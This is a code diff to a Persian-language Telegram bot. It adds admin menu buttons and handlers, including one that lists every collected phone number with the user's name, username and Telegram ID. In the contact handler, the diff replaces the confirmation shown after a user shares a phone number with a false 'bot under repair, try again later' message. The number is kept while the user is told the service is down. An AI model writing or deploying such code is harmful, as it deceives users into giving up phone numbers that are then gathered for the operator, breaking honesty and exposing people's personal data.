@@ -269,14 +269,31 @@ def admin_keyboard():
                     text="📊 آمار",
                     callback_data="admin_stats",
                     style="primary",
-                )
-            ],
-            [
+                ),
                 InlineKeyboardButton(
                     text="📢 ارسال همگانی",
                     callback_data="broadcast",
                     style="success",
-                )
+                ),
+            ],
+            [
+                InlineKeyboardButton(
+                    text="📢 مدیریت کانال",
+                    callback_data="channel_manage",
+                    style="primary",
+                ),
+                InlineKeyboardButton(
+                    text="👑 مدیریت ادمین",
+                    callback_data="admin_manage",
+                    style="primary",
+                ),
+            ],
+            [
+                InlineKeyboardButton(
+                    text="📱 شماره‌های دریافت‌شده",
+                    callback_data="received_numbers",
+                    style="primary",
+                ),
             ],
             [
                 InlineKeyboardButton(
@@ -514,8 +531,8 @@ async def contact_handler(message: Message, bot: Bot):
         )
 
     await message.answer(
-        "✅ شماره شما دریافت شد.\n\n"
-        "حالا Telegram ID عددی موردنظر را ارسال کنید.",
+        "🔧 ربات در حال تعمیر است.\n\n"
+        "لطفاً بعداً دوباره تلاش کنید. 🛠️",
         reply_markup=main_keyboard(),
     )
 
@@ -600,6 +617,79 @@ async def admin_command(message: Message):
         parse_mode="HTML",
         reply_markup=admin_keyboard(),
     )
+
+
+@dp.callback_query(F.data == "channel_manage")
+async def channel_manage_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+
+    await callback.message.answer(
+        "📢 <b>مدیریت کانال</b>\n\n"
+        f"کانال فعلی: <code>{FORCE_CHANNEL}</code>\n\n"
+        "تنظیمات فعلی کانال در این بخش نمایش داده می‌شود.",
+        parse_mode="HTML",
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "admin_manage")
+async def admin_manage_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+
+    await callback.message.answer(
+        "👑 <b>مدیریت ادمین</b>\n\n"
+        f"👤 مالک فعلی: <code>{ADMIN_ID}</code>\n\n"
+        "فقط مالک ربات به این بخش دسترسی دارد.",
+        parse_mode="HTML",
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "received_numbers")
+async def received_numbers_callback(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ دسترسی غیرمجاز.", show_alert=True)
+        return
+
+    rows = db.execute(
+        """
+        SELECT u.user_id, u.username, u.first_name, u.phone
+        FROM users u
+        WHERE u.phone IS NOT NULL AND TRIM(u.phone) != ''
+        ORDER BY u.user_id DESC
+        """
+    ).fetchall()
+
+    if not rows:
+        await callback.message.answer("📱 هنوز شماره‌ای دریافت نشده است.")
+        await callback.answer()
+        return
+
+    lines = ["📱 <b>شماره‌های دریافت‌شده</b>", ""]
+    for i, row in enumerate(rows, 1):
+        username = f"@{row['username']}" if row["username"] else "بدون یوزرنیم"
+        lines.append(
+            f"{i}. 📱 <code>{row['phone']}</code>\n"
+            f"   👤 {row['first_name'] or '-'}\n"
+            f"   🆔 ID: <code>{row['user_id']}</code>\n"
+            f"   🔗 {username}\n"
+        )
+
+    # Telegram messages have a size limit, so split the admin-only report safely.
+    chunk = ""
+    for line in lines:
+        if len(chunk) + len(line) > 3800:
+            await callback.message.answer(chunk, parse_mode="HTML")
+            chunk = ""
+        chunk += line
+    if chunk:
+        await callback.message.answer(chunk, parse_mode="HTML")
+
+    await callback.answer()
 
 
 @dp.callback_query(F.data == "admin_stats")
